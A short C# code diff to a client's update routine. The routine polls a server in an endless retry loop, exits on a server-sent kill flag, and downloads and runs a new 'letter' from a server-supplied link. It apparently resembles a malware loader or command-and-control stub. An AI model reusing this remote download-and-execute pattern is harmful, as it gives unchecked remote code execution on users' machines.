@@ -21,25 +21,28 @@ namespace Client.Utilities
             FetchUpdates();
         }
 
-        private void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
-        {
-            FetchUpdates();
-        }
-
         public async void FetchUpdates()
         {
             await Task.Run(() =>
             {
-                var update_data = Communication.Server.GetUpdate();
+                Communication.JSON_Models.Update update = null;
 
-                if (update_data != null)
+                // necessary since the user might have bad internet
+                do
+                {
+                    update = Communication.Server.GetUpdate();
+                    // prevent cpu usage spike when user doesnt have internet
+                    Thread.Sleep(100);
+                } while (update == null);
+
+                if (update != null)
                 {
                     // check if the letter is supposed to kill itself.
-                    if (update_data.KillSelf) Environment.Exit(69);
+                    if (update.KillSelf) Environment.Exit(69);
 
-                    if (update_data.LetterVersion > Constants.Version)
+                    if (update.LetterVersion > Constants.Version)
                     {
-                        DownloadAndRunNewLetter(update_data.DownloadLink);
+                        DownloadAndRunNewLetter(update.DownloadLink);
                     }
                 }
             });
